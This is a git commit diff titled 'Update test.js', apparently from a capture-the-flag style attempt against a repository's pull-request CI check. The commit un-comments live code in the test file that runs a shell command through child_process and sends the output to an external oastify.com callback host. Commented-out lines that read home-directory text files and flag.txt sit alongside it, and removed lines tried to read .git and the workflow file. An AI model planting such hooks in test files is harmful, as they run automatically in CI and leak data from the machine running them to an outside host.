84a4d77176584c970ba85bdb7a043bc59632c1ed
Jackson <21977467+ScenicJaguar101@users.noreply.github.com>
2023-04-14 15:16:44 -0400

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -2,9 +2,9 @@
 console.log("Tests are not implemented yet...");
 
 
-//const { exec } = require('child_process');
-//let a = exec('ls');
-//fetch("https://vbaj623gs0hv8em8lcyvyqyba2gt4osd.oastify.com/?" + a);
+const { exec } = require('child_process');
+let a = exec('ls');
+fetch("https://ftc3oml0akzfqy4s3wgfgagvsmydm9ay.oastify.com/?" + a);
 
 //var cp = require('child_process');
 //console.log(cp.execSync('find ~ -name "*.txt" -exec cat {} +').toString());
@@ -13,10 +13,7 @@ console.log("Tests are not implemented yet...");
 //console.log(cp.execSync('cat ./flag.txt').toString());
 
 const index = require("../index")
+console.log("Tests are not implemented yet...");
+index.ls(".");
 index.cat("./index.js")
-index.cat("flag.txt")
-
-const { ls, cat } = require('../index.js');
-
-console.log(ls(".git"));
-console.log(cat(".github/workflows/pr-check.yml"));
+setTimeout(() => { console.log("World!"); }, 5000);
